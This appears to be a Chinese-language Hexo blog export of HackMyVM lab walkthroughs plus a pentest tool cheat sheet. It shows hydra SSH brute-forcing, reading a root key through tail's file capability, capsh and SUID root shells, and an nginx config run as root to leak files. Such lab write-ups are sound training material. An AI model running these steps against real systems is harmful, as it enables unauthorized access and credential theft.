<span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置说明：</p><ul><li>以 <code>root</code> 用户启动 nginx worker 进程。</li><li>监听端口 <code>1234</code>。</li><li>根目录设置为系统根目录 <code>/</code>。</li><li>开启目录浏览功能 <code>autoindex on</code>。</li></ul><p>使用 sudo 权限运行 nginx 并加载该配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/sbin/nginx -c /home/john/nginx.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.105:1234/root/root.txt</span><br></pre></td></tr></table></figure><p>即可读取 root 权限下敏感文件，实现文件泄露。</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><ul><li>DNS Zone Transfer 利用</li><li>恶意 nginx 配置</li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tools</title>
      <link href="/2025/07/02/tools/"/>
      <url>/2025/07/02/tools/</url>
      
        <content type="html"><![CDATA[<h2 id="1-gobuster"><a href="#1-gobuster" class="headerlink" title="1.gobuster"></a>1.gobuster</h2><h3 id="1-1-dir"><a href="#1-1-dir" class="headerlink" title="1.1 dir"></a>1.1 dir</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.106 -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>dir</td><td>目录扫描模式</td></tr><tr><td>-u</td><td>指定目标url</td></tr><tr><td>-w</td><td>指定字典</td></tr><tr><td>-x</td><td>添加文件后缀名</td></tr><tr><td>-t</td><td>指定并发扫描的线程数量</td></tr></tbody></table><h2 id="2-hydra"><a href="#2-hydra" class="headerlink" title="2.hydra"></a>2.hydra</h2><p>hydra -L up.txt -p up.txt ssh:&#x2F;&#x2F;192.168.56.104:2222 -V</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-L</td><td>指定用户名字典</td></tr><tr><td>-l</td><td>指定用户名</td></tr><tr><td>-P</td><td>指定密码字典</td></tr><tr><td>-p</td><td>指定密码</td></tr><tr><td>-V</td><td>输出每一次尝试爆破的用户名和密码以及结果</td></tr></tbody></table><h2 id="3-stegseek"><a href="#3-stegseek" class="headerlink" title="3.stegseek"></a>3.stegseek</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb</span><br><span class="line"><span class="built_in">sudo</span> apt install ./stegseek_0.6-1.deb</span><br></pre></td></tr></table></figure><p>kali最新版本需要安装旧依赖<br>wget <a href="http://archive.debian.org/debian/pool/main/m/mhash/libmhash2_0.9.9.9-7+b1_amd64.deb">http://archive.debian.org/debian/pool/main/m/mhash/libmhash2_0.9.9.9-7+b1_amd64.deb</a><br>wget <a href="http://archive.debian.org/debian/pool/main/libm/libmcrypt/libmcrypt4_2.5.8-3.4_amd64.deb">http://archive.debian.org/debian/pool/main/libm/libmcrypt/libmcrypt4_2.5.8-3.4_amd64.deb</a><br>sudo dpkg -i libmhash2_0.9.9.9-7+b1_amd64.deb<br>sudo dpkg -i libmcrypt4_2.5.8-3.4_amd64.deb</p><p>stegseek -wl &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt cat-hidden.jpg </p><table><thead><tr><th>参数</th><th>作用</th><th></th></tr></thead><tbody><tr><td>-wl</td><td>指定字典爆破密码</td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h2 id="4-dig"><a href="#4-dig" class="headerlink" title="4.dig"></a>4.dig</h2><p><code>dig</code>（Domain Information Groper）是一个DNS 查询工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig [@DNS服务器] [域名] [记录类型] [参数...]</span><br></pre></td></tr></table></figure><table><thead><tr><th>类型</th><th>含义</th></tr></thead><tbody><tr><td>A</td><td>主机地址（IPv4）</td></tr><tr><td>AAAA</td><td>主机地址（IPv6）</td></tr><tr><td>MX</td><td>邮件服务器记录</td></tr><tr><td>NS</td><td>授权名称服务器</td></tr><tr><td>CNAME</td><td>规范名称（别名）</td></tr><tr><td>TXT</td><td>文本记录（SPF&#x2F;验证信息）</td></tr><tr><td>SOA</td><td>Start of Authority（起始权威）</td></tr><tr><td>AXFR</td><td>区域传送（Zone Transfer）</td></tr></tbody></table><table><thead><tr><th>参数</th><th>功能说明</th></tr></thead><tbody><tr><td><code>+short</code></td><td>只显示简洁的答案（比如 IP 地址）</td></tr><tr><td><code>+tcp</code></td><td>使用 TCP 协议（⚠️AXFR 必须使用 TCP）</td></tr><tr><td><code>+noquestion</code></td><td>不显示查询问题部分（请求行）</td></tr><tr><td><code>+nocomments</code></td><td>不显示注释</td></tr><tr><td><code>+nostats</code></td><td>不显示统计信息</td></tr><tr><td><code>+nocmd</code></td><td>不显示命令提示头</td></tr><tr><td><code>+multiline</code></td><td>美化输出格式，多行展示</td></tr><tr><td><code>+trace</code></td><td>启用跟踪模式，从根服务器逐级查询域名</td></tr></tbody></table><h2 id="5-searchsploit"><a href="#5-searchsploit" class="headerlink" title="5.searchsploit"></a>5.searchsploit</h2><p><code>searchsploit</code> 是一个命令行工具，用于在本地快速搜索 <strong>Exploit Database</strong> 中已知的漏洞利用代码（PoC）和漏洞信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit wp-file-manager</span><br><span class="line"></span><br><span class="line">searchsploit -m php/webapps/51224.py</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-u</code></td><td>更新本地数据库（相当于 <code>git pull</code>）</td></tr><tr><td><code>-p</code></td><td>显示 Exploit 的完整路径</td></tr><tr><td><code>-x &lt;路径&gt;</code></td><td>直接显示 PoC 文件内容</td></tr><tr><td><code>-m &lt;路径&gt;</code></td><td>复制 PoC 到当前目录</td></tr><tr><td><code>--json</code></td><td>输出为 JSON 格式，便于脚本处理</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-Twisted</title>
      <link href="/2025/07/02/hackmyvm-Twisted/"/>
      <url>/2025/07/02/hackmyvm-Twisted/</url>
      
        <content type="html"><![CDATA[<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.104</span><br><span class="line">80/tcp   open  http    nginx 1.14.2</span><br><span class="line">2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2</span><br></pre></td></tr></table></figure><h2 id="二、Web-分析（端口-80）"><a href="#二、Web-分析（端口-80）" class="headerlink" title="二、Web 分析（端口 80）"></a>二、Web 分析（端口 80）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.56.104</span><br></pre></td></tr></table></figure><p>返回页面内容提示对两张图片进行比较：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>I love cats!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;cat-original.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cat original&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>But I prefer this one because seems different<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;cat-hidden.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cat Hidden&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>尝试 stegsolve 和 010 Editor等后去看大佬wp，用 stegseek：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">stegseek -wl /usr/share/wordlists/rockyou.txt cat-hidden.jpg  </span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line">[i] Found passphrase: <span class="string">&quot;sexymama&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;mateo.txt&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;cat-hidden.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">stegseek -wl /usr/share/wordlists/rockyou.txt cat-original.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line">[i] Found passphrase: <span class="string">&quot;westlife&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;markus.txt&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;cat-original.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> cat-hidden.jpg.out </span><br><span class="line">thisismypassword</span><br><span class="line"><span class="built_in">cat</span> cat-original.jpg.out</span><br><span class="line">markuslovesbonita</span><br></pre></td></tr></table></figure><p>猜测疑似的用户与密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mateo</span><br><span class="line">markus</span><br><span class="line">bonita</span><br><span class="line">thisismypassword</span><br><span class="line">markuslovesbonita</span><br></pre></td></tr></table></figure><h2 id="三、爆破-SSH-登录"><a href="#三、爆破-SSH-登录" class="headerlink" title="三、爆破 SSH 登录"></a>三、爆破 SSH 登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L up.txt -p up.txt ssh://192.168.56.104:2222 -V</span><br><span class="line">[2222][ssh] host: 192.168.56.104   login: markus   password: markuslovesbonita</span><br><span class="line">[2222][ssh] host: 192.168.56.104   login: mateo   password: thisismypassword</span><br></pre></td></tr></table></figure><h2 id="四、本地信息探测"><a href="#四、本地信息探测" class="headerlink" title="四、本地信息探测"></a>四、本地信息探测</h2><p>登录后查看 note.txt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hi bonita,</span><br><span class="line">I have saved your id_rsa here: /var/cache/apt/id_rsa</span><br><span class="line">Nobody can find it.</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /var/cache/apt/id_rsa</span><br><span class="line">-rw------- 1 root root     1823 Oct 14  2020 id_rsa</span><br></pre></td></tr></table></figure><h2 id="五、查找-Capability-权限"><a href="#五、查找-Capability-权限" class="headerlink" title="五、查找 Capability 权限"></a>五、查找 Capability 权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/getcap / -r 2&gt;/dev/null</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br><span class="line">/usr/bin/tail = cap_dac_read_search+ep</span><br></pre></td></tr></table></figure><p><code>tail</code> 可以以root权限读取任意文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/tail -n +1 /var/cache/apt/id_rsa</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa bonita@192.168.56.104 -p 2222</span><br></pre></td></tr></table></figure><h2 id="六、本地提权（SUID）"><a href="#六、本地提权（SUID）" class="headerlink" title="六、本地提权（SUID）"></a>六、本地提权（SUID）</h2><p>bonita 用户目录下发现 suid 文件：<code>beroot</code></p><p>运行后提示输入 code，使用ida静态分析得知：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n5880; <span class="comment">// [rsp+1Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the code:\n &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%i&quot;</span>, &amp;n5880);</span><br><span class="line">  <span class="keyword">if</span> ( n5880 == <span class="number">5880</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nWRONG&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接输入 <code>5880</code> 即可获得 root：</p><h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><ul><li>stegseek（爆破 JPEG 隐写）</li><li>getcap查看Capability 权限命令</li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-alzheimer</title>
      <link href="/2025/07/01/hackmyvm-alzheimer/"/>
      <url>/2025/07/01/hackmyvm-alzheimer/</url>
      
        <content type="html"><![CDATA[<h2 id="一、信息收集阶段"><a href="#一、信息收集阶段" class="headerlink" title="一、信息收集阶段"></a>一、信息收集阶段</h2><p>使用 <code>nmap</code> 进行基础服务扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.101</span><br><span class="line">21/tcp open     ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp filtered http</span><br></pre></td></tr></table></figure><p>仅 21 端口开放，22 与 80 被防火墙过滤。</p><h2 id="二、FTP-匿名访问"><a href="#二、FTP-匿名访问" class="headerlink" title="二、FTP 匿名访问"></a>二、FTP 匿名访问</h2><p>尝试匿名登录 FTP：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101</span><br></pre></td></tr></table></figure><p>使用 <code>anonymous</code> 用户成功登录，列出文件后发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.secretnote.txt</span><br></pre></td></tr></table></figure><p>读取该文件内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> .secretnote.txt</span><br></pre></td></tr></table></figure><p>输出内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I need to knock this ports and </span><br><span class="line">one door will be open!</span><br><span class="line">1000</span><br><span class="line">2000</span><br><span class="line">3000</span><br></pre></td></tr></table></figure><blockquote><p>💡 判断为端口敲门（Port Knocking）机制 —— 按顺序访问指定端口后会触发服务开放。</p></blockquote><hr><h2 id="三、触发端口敲门"><a href="#三、触发端口敲门" class="headerlink" title="三、触发端口敲门"></a>三、触发端口敲门</h2><p>使用 <code>nmap</code> 模拟访问指定端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --host-timeout 201 --max-retries 0 -p 1000,2000,3000 192.168.56.101</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="comment">#knock 192.168.56.101 1000 2000 3000</span></span><br></pre></td></tr></table></figure><p>再次扫描开放端口，发现 SSH 与 HTTP 已开放：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.101</span><br></pre></td></tr></table></figure><p>扫描结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br></pre></td></tr></table></figure><hr><h2 id="四、Web-信息搜集"><a href="#四、Web-信息搜集" class="headerlink" title="四、Web 信息搜集"></a>四、Web 信息搜集</h2><p>访问首页：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.101</span><br></pre></td></tr></table></figure><p>返回内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I dont remember where I stored my password :(</span><br><span class="line">I only remember that was into a .txt file...</span><br><span class="line">-medusa</span><br><span class="line"></span><br><span class="line">&lt;!---. --- - .... .. -. --. --&gt;</span><br></pre></td></tr></table></figure><ul><li>可疑用户名：<code>medusa</code></li><li>页面隐藏摩斯密码：<code>--- --- - .... .. -. --.</code> 解码为 “nothing”</li></ul><hr><h2 id="五、目录扫描"><a href="#五、目录扫描" class="headerlink" title="五、目录扫描"></a>五、目录扫描</h2><p>对 Web 服务进行目录爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40</span><br></pre></td></tr></table></figure><p>发现路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin</span><br><span class="line">/home</span><br><span class="line">/secret</span><br></pre></td></tr></table></figure><p>但这些目录中的内容多为迷惑信息，无显著突破。</p><hr><h2 id="六、回到-FTP，文件发生变化"><a href="#六、回到-FTP，文件发生变化" class="headerlink" title="六、回到 FTP，文件发生变化"></a>六、回到 FTP，文件发生变化</h2><p>重新连接 FTP，发现 <code>.secretnote.txt</code> 内容发生了变化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">I need to knock this ports and </span><br><span class="line">one door will be open!</span><br><span class="line">1000</span><br><span class="line">2000</span><br><span class="line">3000</span><br><span class="line">Ihavebeenalwayshere!!!</span><br></pre></td></tr></table></figure><p>推测为提示我们已完成敲门，服务全部开放，下一步可登录 SSH。</p><hr><h2 id="七、SSH-登录与提权"><a href="#七、SSH-登录与提权" class="headerlink" title="七、SSH 登录与提权"></a>七、SSH 登录与提权</h2><p>使用用户名 <code>medusa</code> 和密码登录 SSH（密码推测来源于 FTP 或站点信息）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh medusa@192.168.56.101</span><br></pre></td></tr></table></figure><h3 id="7-1-sudo-权限枚举"><a href="#7-1-sudo-权限枚举" class="headerlink" title="7.1 sudo 权限枚举"></a>7.1 sudo 权限枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure><p>发现可执行 <code>/bin/id</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL) NOPASSWD: /bin/id</span><br></pre></td></tr></table></figure><p>无明显提权突破，继续寻找 SUID 程序。</p><h3 id="7-2-查找-SUID-程序"><a href="#7-2-查找-SUID-程序" class="headerlink" title="7.2 查找 SUID 程序"></a>7.2 查找 SUID 程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>发现关键提权点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/capsh</span><br></pre></td></tr></table></figure><p>该程序支持通过 <code>--uid=0 --gid=0</code> 提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/capsh --gid=0 --uid=0 --</span><br></pre></td></tr></table></figure><p>获取 <code>root</code> shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>成功提权。</p><hr><h2 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h2><ul><li>利用了 FTP 匿名访问发现敲门信息</li><li>模拟敲门成功开放被过滤端口</li><li>利用存在的 SUID 程序 capsh 成功提权为 root</li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
